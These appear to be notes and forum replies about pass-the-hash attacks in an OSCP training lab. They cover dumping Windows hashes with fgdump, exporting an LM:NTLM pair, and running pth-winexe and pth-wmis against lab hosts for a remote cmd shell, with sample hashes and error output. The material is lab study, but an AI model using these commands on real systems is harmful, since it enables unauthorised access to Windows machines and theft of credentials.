Using fgdump.exe you dump the password hashes
From the hash file you copy the LM and NTML part of a line:

Administrator:500:NO PASSWORD*********************:259745CB123A52AA2E693AAACCA2DB52

You replace the NO PASSWORD*** with the LM hash of the specified password
then export both as a variable:

root@kali:~/Desktop/OSCP# export SMBHASH=0182BD0BD4444BF836077A718CCDF409:259745CB123A52AA2E693AAACCA2DB52


root@kali:~/Desktop/OSCP# /usr/bin/pth-winexe -U administrator% //10.11.1.5 cmd
E_md4hash wrapper called.
HASH PASS: Substituting user supplied NTLM HASH...
smb_signing_good: BAD SIG: seq 1
ERROR: Cannot connect to svcctl pipe. NT_STATUS_ACCESS_DENIED.
root@kali:~/Desktop/OSCP/ALICE# 

And it should work, but it doesn't.
Such mistery, much amazing.


The fix:
Ok, its only taken me two solid days but I've worked out what the issue is. 
I have pwned two different machines and downloaded the hashes, but no matter what I did I couldn't get pth-winexe it to work. I was getting the same error as you. I cloned the updated PTH files from Git and when I ran the command from those files I got a slightly different more descriptive error message. I searched for that error message on Google and found out that there is a specific service that needs to be running on the target host. I went back to one of my pwned boxes and sure enough the service was not running. Once I started the servcie the pth-winexe command worked, even from the original installed files, no need for the git versions. 

I hope that's not too much of a spoiler Mods?

BTW, 
pth-winexe -U Administrator%yyyyyyyyyyyyyyyyyyyyyyyyyyyyy:xxxxxx xxxxxxxxxxxxxxxxxxxxxxxxxx //10.11.1.xxx cmd
gives the error message, but the following works, it authenticates but doesn't give a shell; 
pth-wmis -U Administrator%yyyyyyyyyyyyyyyyyyyyyyyyyyyyy:xxxxxx xxxxxxxxxxxxxxxxxxxxxxxxxx //10.11.1.xxx cmd
HASH PASS: Substituting user supplied NTLM HASH...
HASH PASS: Substituting user supplied NTLM HASH...

I found the following page, which I'm going to give a try;
